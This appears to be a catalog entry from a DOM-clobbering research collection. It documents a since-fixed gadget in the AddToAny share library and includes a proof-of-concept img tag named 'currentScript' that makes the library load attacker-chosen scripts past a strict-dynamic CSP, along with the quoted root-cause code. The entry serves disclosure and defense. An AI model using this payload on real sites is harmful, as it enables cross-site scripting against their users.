---
description: AddToAny gets people to the right destination to share or save your content, whether it's in a native app or on the web.
gadgets:
  ≤21/08/2024:
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - img-tag
      - name-attr
      - src-attr
      - strict-dynamic-csp
      - before-lib-load
    pocs:
      - description: The [AddToAny](https://www.addtoany.com/) library was using the `document.currentScript` property to load additional scripts.
        code: |
          <!-- user input -->
          <img src="https://addtoany@[current-host]/assets/xss/index.js?" name="currentScript">

          <script nonce="secret" async src="/assets/libs/addtoany/20240821/page.js"></script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://web.archive.org/web/20240821021100/https://static.addtoany.com/menu/page.js">https://web.archive.org/web/20240821021100/https://static.addtoany.com/menu/page.js</a>

      ```javascript
      _ = (d = o.currentScript) && d.src ? d.src : "",
      e = d && !d.async && !d.defer,
      
      // [...]

      a = (t = n.static_server) ? t + "/" : "https://static.addtoany.com/menu/",
      p = _ && -1 !== _.split("/")[2].indexOf("addtoany"),
      l = (p = (l = !t && p ? _ : a).match(/^[^?#]+\//)) ? p[0] : l,
      
      // [...]

      var e = l + (t ? "" : "modules/");
      c(e + "core" + g + ".js", !0);
      ```
    links:
      - https://web.archive.org/web/20240821021100/https://static.addtoany.com/menu/page.js#before-fix
      - https://web.archive.org/web/20240821021327/https://static.addtoany.com/menu/page.js#after-fix
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/addtoany.md
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
---
